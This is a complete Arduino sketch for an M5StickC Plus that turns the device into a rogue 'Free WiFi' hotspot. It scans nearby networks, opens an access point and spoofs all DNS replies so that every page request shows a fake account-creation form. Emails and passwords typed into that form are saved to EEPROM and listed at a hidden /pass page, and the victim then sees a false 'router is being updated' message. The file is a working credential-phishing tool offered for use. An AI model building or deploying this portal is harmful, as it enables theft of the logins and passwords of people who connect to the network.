#include <M5StickCPlus.h> //http://docs.m5stack.com/en/api/stickc/lcd_m5stickc
#include <WiFi.h>
#include <EEPROM.h>
#include <WebServer.h>
#include <DNSServer.h> 
#include "Image.h" 

// Default SSID name
const char* SSID_NAME = "Free WiFi"; // the ssid/name of the wifi, the esp will be connected to
const char* password = NULL; // the password of that wifi

#define SUBTITLE "Router info."
#define TITLE "Free WiFi"
#define POST_TITLE "Updating..."
#define POST_BODY "The router is being updated. Please, wait until the proccess finishes.</br>Thank you."
#define PASS_TITLE "Passwords"
#define CLEAR_TITLE "Cleared"

// Init system settings
const byte HTTP_CODE = 200;
const byte TICK_TIMER = 1000;
const byte DNS_PORT = 53;

String allPass = "";
String newSSID = "";
String currentSSID = "";
String hostname = "CaptivePortal-Open";

IPAddress apIP(8,8,4,4); // The default android DNS
DNSServer dnsServer;
WebServer webServer(80);
//WiFiServer server(80); //Simple alternative to WebServer

// For storing passwords in EEPROM.
int initialCheckLocation = 20; // Location to check whether the ESP is running for the first time.
int passStart = 30;            // Starting location in EEPROM to save password.
int passEnd = passStart;       // Ending location in EEPROM to save password.

unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0, buttonBcout=0;

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<","&lt;");
  a.replace(">","&gt;");
  a.substring(0,200); 
  return a; }

String footer() { 
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t) {
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }"
    "input[name=\"m\"] { -webkit-text-security: square; }"
    "input[name=\"b\"] { -webkit-text-security: square; }";

  String h = "<!DOCTYPE html><html>"
    "<head><title>" + a + " :: " + t + "</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>" + CSS + "</style>"
    "<meta charset=\"UTF-8\"></head>"
    "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h; 
  }

String index() {
  return header(TITLE) + "<div><form action=/post method=post><label>Please creat an Account:</label>"+
        "<input type=email name=n placeholder=\"E-Mail\"> <br> <input type=text name=m placeholder=\"Password\"> <br> <input type=text name=b placeholder=\"Repeat Password\"> </input><input type=submit value=Create></form>" + footer();
}

String posted() {
  String pass = input("n");
  if(!pass.isEmpty()){
    pass = "<li><b>" + pass + " | ";       // Adding the User in a ordered list.  
    allPass += pass;                       // Updating the full passwords/Users

    store2EEPROM(pass);
  
    pass = input("m");
    pass = pass + "</li></b>"; // Adding password in a ordered list.
    allPass += pass;  // Updating the full passwords/Users                     

    store2EEPROM(pass);
    
    EEPROM.write(passEnd, '\0');
    EEPROM.commit();
  }
  return header(POST_TITLE) + POST_BODY + footer();
}

void store2EEPROM(String pass){
 // Storing user and / or password to EEPROM.
    for (int i = 0; i <= pass.length(); ++i)
    {
      EEPROM.write(passEnd + i, pass[i]); // Adding user / PW to existing in EEPROM.
    }
    passEnd += pass.length(); // Updating end position of user / PW in EEPROM.  
}

String pass() {
  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String ssid() {
  return header("Change SSID") + "<p>Here you can change the SSID name. After pressing the button \"Change SSID\" you will lose the connection, so reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>"+
    "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
}

String postedSSID() {
  String postedSSID = input("s"); 
  newSSID="<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i) {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
}

String clear() {
  allPass = "";
  passEnd = passStart; // Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK() {
  for (int counter = 0; counter < 2; counter++)
  {
    // For blinking the LED.
    digitalWrite(10, counter % 2);
    delay(500);
  }
}

int scanNetworks() {
  IPAddress ip(192, 168, 0, 50); 
  WiFi.softAPConfig(ip, ip, IPAddress(255, 255, 255, 0));
  WiFi.mode(WIFI_STA);  
  LCD_Clear();
  M5.Lcd.setCursor(10, 45);
  M5.Lcd.setTextSize(3);  
  M5.Axp.ScreenSwitch(1);
  M5.Lcd.setTextColor(BLUE);
  M5.Lcd.printf("Scanning...");
  M5.Lcd.setCursor(70, 85);
  M5.Lcd.setTextSize(1);  
  M5.Lcd.printf("Please wait...");
  M5.Lcd.setTextSize(2); 
  // WiFi.scanNetworks will return the number of networks found.
    int n = WiFi.scanNetworks();
    LCD_Clear();
    if (n == 0) {
        M5.Lcd.printf("no Networks found");
    } else {
      /*
        M5.Lcd.setTextSize(2);
        M5.Lcd.setTextColor(WHITE);
        M5.Lcd.printf("%d",n);
        M5.Lcd.printf(" Networks found:\n");
      */
        M5.Lcd.setTextSize(1);
        M5.Lcd.setTextColor(RED);
        M5.Lcd.printf("Nr | SSID | Encryption\n");
        M5.Lcd.setTextColor(GREEN);
        for (int i = 0; i < n; ++i) {
            // Print SSID and RSSI for each network found
            M5.Lcd.printf("%2d",i + 1);
            M5.Lcd.printf(" | ");
            M5.Lcd.printf("%s", WiFi.SSID(i).c_str());
            M5.Lcd.printf(" | ");
            //M5.Lcd.printf("%4d", WiFi.RSSI(i));
            //M5.Lcd.printf(" | ");
            //M5.Lcd.printf("%2d", WiFi.channel(i));
            //M5.Lcd.printf(" | ");
            switch (WiFi.encryptionType(i))
            {
            case WIFI_AUTH_OPEN:
                M5.Lcd.printf("open");
                break;
            case WIFI_AUTH_WEP:
                M5.Lcd.printf("WEP");
                break;
            case WIFI_AUTH_WPA_PSK:
                M5.Lcd.printf("WPA");
                break;
            case WIFI_AUTH_WPA2_PSK:
                M5.Lcd.printf("WPA2");
                break;
            case WIFI_AUTH_WPA_WPA2_PSK:
                M5.Lcd.printf("WPA+WPA2");
                break;
            case WIFI_AUTH_WPA2_ENTERPRISE:
                M5.Lcd.printf("WPA2-EAP");
                break;
            case WIFI_AUTH_WPA3_PSK:
                M5.Lcd.printf("WPA3");
                break;
            case WIFI_AUTH_WPA2_WPA3_PSK:
                M5.Lcd.printf("WPA2+WPA3");
                break;
            case WIFI_AUTH_WAPI_PSK:
                M5.Lcd.printf("WAPI");
                break;
            default:
                M5.Lcd.printf("unknown");
            }
            delay(10);
            M5.Lcd.printf("\n");
        }
    }
    // Delete the scan result to free memory for code below.
    WiFi.scanDelete();
    return n;
}

void LCD_Clear() {
    M5.Lcd.fillScreen(BLACK);
    M5.Lcd.setCursor(0, 0);
}

void openServer() {
  WiFi.mode(WIFI_AP);
  
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));

  const char *cstr = currentSSID.c_str();
  WiFi.softAP(cstr);

  // Start webserver
  dnsServer.start(DNS_PORT, "*", apIP); // DNS spoofing (Only for HTTP) 
  webServer.on("/post",[]() {webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/ssid",[]() {webServer.send(HTTP_CODE, "text/html", ssid()); });
  webServer.on("/postSSID",[]() {webServer.send(HTTP_CODE, "text/html", postedSSID()); });
  webServer.on("/pass",[]() {webServer.send(HTTP_CODE, "text/html", pass()); });
  webServer.on("/clear",[]() {webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.onNotFound([]() {lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.begin();
}

void printServerInit()
{
  M5.Lcd.setTextColor(WHITE);
  M5.Lcd.setTextSize(1);  // Set font size.
  M5.Lcd.printf("Server init - CMD: /ssid /pass\nIP:");
  M5.Lcd.print(WiFi.softAPIP());
  M5.Lcd.printf(" - SSID: %s\n", currentSSID);  
}

void battery_status()
{
  double vbat = M5.Axp.GetVbatData() * 1.1 / 1000;
  if (vbat >= 4)
  {
    M5.Lcd.pushImage(227, 1, 14, 8, bat_3);
  }
  else if (vbat >= 3.7)
  {
    M5.Lcd.pushImage(227, 1, 14, 8, bat_2);
  }
  else if (vbat < 3.7)
  {
    M5.Lcd.pushImage(227, 1, 14, 8, bat_1);
  }
}

void setup()
{
  M5.begin();  // Initialize M5StickC Plus. 
  M5.Axp.ScreenBreath(7);   
  M5.Lcd.setTextSize(2);  // Set font size.
  M5.Lcd.setRotation(3);  // Rotate the screen.
  buttonBcout=0;  
  scanNetworks();
  M5.Axp.ScreenBreath(12);
  WiFi.setHostname(hostname.c_str());
  pinMode(10, OUTPUT);
  digitalWrite(10, HIGH);

  //EEPROM  
  //__________________________________________________________________
  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // Check whether the ESP is running for the first time.
  String checkValue = "first"; // This will will be set in EEPROM after the first run.
  for (int i = 0; i < checkValue.length(); ++i)
  {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i])
    {
      // Add "first" in initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i)
      {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');         // Clear SSID location in EEPROM.
      EEPROM.write(passStart, '\0'); // Clear password location in EEPROM
      EEPROM.commit();
      break;
    }    
  }

  // Read EEPROM SSID
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0') {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  // Reading stored password and end location of passwords in the EEPROM.
  while (EEPROM.read(passEnd) != '\0')
  {
    allPass += char(EEPROM.read(passEnd)); // Reading the store password in EEPROM.
    passEnd++;                             // Updating the end location of password in EEPROM.
  }

  // Setting currentSSID -> SSID in EEPROM or default one.
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;
}

void loop()
{
    M5.update();  // Read the press state of the key.
    battery_status(); 
    if (M5.BtnA.wasPressed()) {  // If the button A is pressed. 
        
        scanNetworks();
        buttonBcout=0; 
    }
    if (M5.BtnB.wasPressed()) {  // If the button B is pressed.
        ++buttonBcout;
        if (WiFi.softAPIP() != apIP && buttonBcout==1){ //Um bei initialisierten Server eine erneute Initialisierung zu verhindern
          openServer();
          printServerInit();
        } 
        if(buttonBcout%2==0 && buttonBcout!=1) M5.Axp.ScreenSwitch(0);
        else if(buttonBcout%2!=0 && buttonBcout!=1) M5.Axp.ScreenSwitch(1); 
    }
    
    if ((millis() - lastTick) > TICK_TIMER){
      lastTick = millis();
      } 
    dnsServer.processNextRequest(); 
    webServer.handleClient(); 
}